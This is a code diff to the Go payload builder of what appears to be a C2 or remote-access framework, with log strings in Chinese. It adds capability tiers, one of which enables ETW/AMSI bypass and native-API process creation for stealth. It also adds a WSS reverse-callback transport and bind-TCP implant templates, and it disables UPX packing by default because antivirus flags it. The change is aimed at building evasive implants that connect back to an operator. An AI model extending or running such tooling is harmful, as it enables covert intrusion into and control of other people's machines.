@@ -36,6 +36,12 @@ type PayloadConfig struct {
 	EncryptionSalt    string `json:"encryption_salt"`
 	ObfuscationMode   string `json:"obfuscation_mode"`
 	Jitter            int    `json:"jitter"`
+	// Capability profile: "minimal" | "standard" | "full" (default standard).
+	// Maps to cargo features on the client:
+	//   minimal  → transport + minimal post-ex (still includes Layer-A Nt process path on Windows)
+	//   standard → PTY/SOCKS/plugin/BOF/.NET; Windows Layer-A hardened APIs always on
+	//   full     → standard + stealth-adv (Layer-B: ETW/AMSI, NtCreateUserProcess with version gate + fallback)
+	Profile string `json:"profile"`
 }
 
 // copyDir recursively copies a directory tree
@@ -83,6 +89,8 @@ func BuildAgentWithLogger(conf PayloadConfig, logChan chan<- string) (string, er
 		connStr = conf.Host 
 	} else if protocol == "bind-tcp" || protocol == "正向tcp" {
 		connStr = fmt.Sprintf("bind://0.0.0.0:%s", conf.Port)
+	} else if protocol == "wss" {
+		connStr = fmt.Sprintf("wss://%s:%s/ws", conf.Host, conf.Port)
 	} else {
 		connStr = fmt.Sprintf("ws://%s:%s/ws", conf.Host, conf.Port)
 	}
@@ -152,14 +160,38 @@ func BuildAgentWithLogger(conf PayloadConfig, logChan chan<- string) (string, er
 		args = append(args, "--target", target)
 	}
 
+	// Forward and reverse share the SAME capability tier: minimal
+	//   shell/fs/proc/pty built-in; BOF/.NET via on-demand modules
+	// Protocol only differs: bind → tcp_bind; reverse → ws/tcp/dns
+	capProfile := "minimal"
+	if p := strings.ToLower(strings.TrimSpace(conf.Profile)); p != "" {
+		switch p {
+		case "standard", "full":
+			// Explicit legacy monolith only if forced
+			capProfile = "standard"
+		default:
+			capProfile = "minimal"
+		}
+	}
+	isBind := protocol == "bind-tcp" || protocol == "正向tcp"
+	if logChan != nil {
+		logChan <- fmt.Sprintf("[Builder] Cargo profile: %s", capProfile)
+		if isBind {
+			logChan <- "[Builder] 正向客户端 — tcp_bind + minimal（与反向同能力；BOF/.NET 按需模块）"
+		} else {
+			logChan <- "[Builder] 反向客户端 — minimal（终端/文件/进程内置；BOF/.NET 按需模块）"
+		}
+	}
 	if protocol == "tcp" {
-		args = append(args, "--no-default-features", "--features", "tcp")
+		args = append(args, "--no-default-features", "--features", "tcp,"+capProfile)
 	} else if protocol == "bind-tcp" || protocol == "正向tcp" {
-		args = append(args, "--no-default-features", "--features", "tcp_bind")
+		args = append(args, "--no-default-features", "--features", "tcp_bind,"+capProfile)
 	} else if protocol == "dns" {
-		args = append(args, "--no-default-features", "--features", "dns")
+		args = append(args, "--no-default-features", "--features", "dns,"+capProfile)
+	} else if protocol == "wss" {
+		args = append(args, "--no-default-features", "--features", "ws,ws-tls,"+capProfile)
 	} else {
-		args = append(args, "--features", "ws")
+		args = append(args, "--no-default-features", "--features", "ws,"+capProfile)
 	}
 
 	if logChan != nil { 
@@ -247,9 +279,13 @@ func BuildAgentWithLogger(conf PayloadConfig, logChan chan<- string) (string, er
 	if logChan != nil { logChan <- "[Builder] 正在对本地 Loader 执行配置补丁..." }
 	if err := moveFile(builtPath, finalPath); err != nil { return "", fmt.Errorf("failed to save artifact: %v", err) }
 
-	// 📦 UPX 极限压缩支持
+	// 📦 UPX 压缩（默认关闭：现代 AV 对 UPX 特征极敏感，几乎是负优化）
+	// 仅在用户明确勾选 UseUPX 时执行。
 	if conf.UseUPX {
-		if logChan != nil { logChan <- "[Builder] 正在执行 UPX 极限压缩..." }
+		if logChan != nil {
+			logChan <- "[Builder] 警告: UPX 会显著提高 AV 检出率，仅建议在实验环境使用..."
+			logChan <- "[Builder] 正在执行 UPX 压缩..."
+		}
 		if err := RunUPX(finalPath); err != nil {
 			if logChan != nil { logChan <- "[!] UPX 失败: " + err.Error() }
 		} else {
@@ -278,13 +314,18 @@ func RebuildTemplates(logChan chan<- string) error {
 		Arch     string
 		Protocol string
 		OutName  string
+		Profile  string
 	}{
-		{"windows", "amd64", "ws", "client_template_windows.exe"},
-		{"windows", "i386", "ws", "client_template_windows_x86.exe"},
-		{"windows", "amd64", "tcp", "client_template_windows_tcp.exe"},
-		{"windows", "amd64", "dns", "client_template_windows_dns.exe"},
-		{"linux", "amd64", "ws", "client_template_linux"},
-		{"linux", "arm64", "ws", "client_template_linux_arm64"},
+		{"windows", "amd64", "ws", "client_template_windows.exe", "standard"},
+		{"windows", "i386", "ws", "client_template_windows_x86.exe", "standard"},
+		{"windows", "amd64", "tcp", "client_template_windows_tcp.exe", "standard"},
+		{"windows", "amd64", "tcp", "client_template_windows_tcp_minimal.exe", "minimal"},
+		{"windows", "amd64", "dns", "client_template_windows_dns.exe", "standard"},
+		{"windows", "amd64", "bind-tcp", "client_template_windows_bind.exe", "standard"},
+		{"linux", "amd64", "ws", "client_template_linux", "standard"},
+		{"linux", "amd64", "tcp", "client_template_linux_tcp", "standard"},
+		{"linux", "amd64", "tcp", "client_template_linux_tcp_minimal", "minimal"},
+		{"linux", "arm64", "ws", "client_template_linux_arm64", "standard"},
 	}
 
 	for _, t := range targets {
@@ -296,6 +337,8 @@ func RebuildTemplates(logChan chan<- string) error {
 			Port:              "8080",
 			AESKey:            "SYSTEM_CONFIG_DATA_ENCRYPT_BLOB_", // Default placeholder
 			HeartbeatInterval: 10,
+			Profile:           t.Profile,
+			UseUPX:            false,
 		}
 		
 		if logChan != nil { logChan <- fmt.Sprintf("[Rebuilder] 正在编译模板: %s...", t.OutName) }
